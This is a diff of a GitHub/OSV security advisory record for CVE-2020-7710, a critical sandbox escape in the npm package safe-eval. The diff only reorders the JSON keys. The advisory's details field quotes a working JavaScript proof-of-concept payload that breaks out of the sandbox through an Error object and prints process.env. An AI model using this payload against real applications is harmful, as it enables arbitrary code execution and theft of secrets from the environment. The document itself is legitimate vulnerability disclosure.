@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-hrpq-r399-whgw",
-  "summary": "Sandbox Breakout / Arbitrary Code Execution in safe-eval",
-  "details": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through Error objects. This may allow attackers to execute arbitrary code in the system. \n\nEvaluating the payload \n```js\n(function (){\n  var ex = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/08/GHSA-hrpq-r399-whgw/GHSA-hrpq-r399-whgw.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "safe-eval",
+        "purl": "pkg:npm/safe-eval"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.4.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2020-7710"
   ],
-  "modified": "2023-11-08T04:04:06.168807Z",
-  "published": "2020-08-25T23:40:53Z",
   "database_specific": {
-    "nvd_published_at": "2020-08-21T10:15:00Z",
     "cwe_ids": [
       "CWE-94"
     ],
-    "severity": "CRITICAL",
     "github_reviewed": true,
-    "github_reviewed_at": "2020-08-25T21:20:22Z"
+    "github_reviewed_at": "2020-08-25T21:20:22Z",
+    "nvd_published_at": "2020-08-21T10:15:00Z",
+    "severity": "CRITICAL"
   },
+  "details": "All versions of `safe-eval` are vulnerable to Sandbox Escape leading to Remote Code Execution. The package fails to restrict access to the main context through Error objects. This may allow attackers to execute arbitrary code in the system. \n\nEvaluating the payload \n```js\n(function (){\n  var ex = new Error\n  ex.__proto__ = null\n  ex.stack = {\n    match: x => {\n      return x.constructor.constructor(\"throw process.env\")()\n    }\n  }\n  return ex\n})()\n``` \n\nprints the contents of `process.env`.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
+  "id": "GHSA-hrpq-r399-whgw",
+  "modified": "2023-11-08T04:04:06.168807Z",
+  "published": "2020-08-25T23:40:53Z",
   "references": [
     {
       "type": "ADVISORY",
@@ -34,36 +58,12 @@
       "url": "https://www.npmjs.com/advisories/1322"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "safe-eval",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/safe-eval"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "last_affected": "0.4.1"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/08/GHSA-hrpq-r399-whgw/GHSA-hrpq-r399-whgw.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Sandbox Breakout / Arbitrary Code Execution in safe-eval"
 }
